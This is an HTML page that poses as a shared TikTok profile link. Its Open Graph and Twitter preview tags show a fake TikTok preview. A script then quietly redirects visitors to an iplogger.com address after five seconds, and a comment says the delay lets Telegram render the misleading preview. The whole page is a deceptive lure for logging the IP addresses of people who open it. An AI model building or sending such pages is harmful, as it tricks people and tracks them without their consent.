<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Open this profile!</title>

  <!-- ✅ Put Open Graph first -->
  <meta property="og:title" content="Open TikTok profile!" />
  <meta property="og:description" content="Visit this TikTok profile of your friend" />
  <meta property="og:image" content="https://yourdomain.com/tiktok-preview.jpg" />
  <meta property="og:url" content="https://tiktok.com/@someuser" />
  <meta property="og:type" content="website" />

  <!-- Optional Twitter fallback -->
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="Open this TikTok profile!" />
  <meta name="twitter:description" content="Visit TikTok profile of your friend" />
  <meta name="twitter:image" content="https://yourdomain.com/tiktok-preview.jpg" />

  <!-- ✅ Use JS redirect instead of meta refresh -->
  <script>
    setTimeout(() => {
      window.location.href = "https://iplogger.com/23fcs5";
    }, 5000); // delay 5s so Telegram can read the preview
  </script>
</head>
<body>
  <p>Redirecting to TikTok profile...</p>
</body>
</html>
